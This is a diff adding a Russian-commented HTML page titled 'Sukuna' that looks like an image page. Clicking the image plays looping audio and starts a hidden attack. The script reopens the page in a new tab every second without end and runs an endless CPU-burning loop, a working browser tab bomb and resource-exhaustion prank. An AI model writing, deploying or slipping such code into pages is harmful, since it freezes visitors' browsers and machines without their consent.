@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sukuna</title>
+</head>
+<body>
+    <img src="png.png" alt="Sukuna" style="width: 100%; height: auto;" id="clickableImage">
+
+    <audio id="audio" src="sound.mp3" loop></audio>
+
+    <script>
+        document.getElementById('clickableImage').addEventListener('click', function() {
+            var audio = document.getElementById('audio');
+            if (audio.paused) {
+                audio.play().catch(function(error) {
+                    console.log("Ошибка воспроизведения: " + error);
+                });
+            }
+
+            // Запуск бесконечного дублирования вкладок
+            function duplicateTab() {
+                window.open(window.location.href);
+                setTimeout(duplicateTab, 1000); // Интервал в 1 секунду между открытиями
+            }
+            duplicateTab();
+
+            // Создаем бесконечную нагрузку
+            function createInfiniteLoad() {
+                // Интенсивные вычисления для создания нагрузки
+                for (let i = 0; i < 1e6; i++) {
+                    Math.sqrt(Math.random()) * Math.random();
+                }
+                requestAnimationFrame(createInfiniteLoad);
+            }
+            createInfiniteLoad();
+        });
+    </script>
+</body>
+</html>
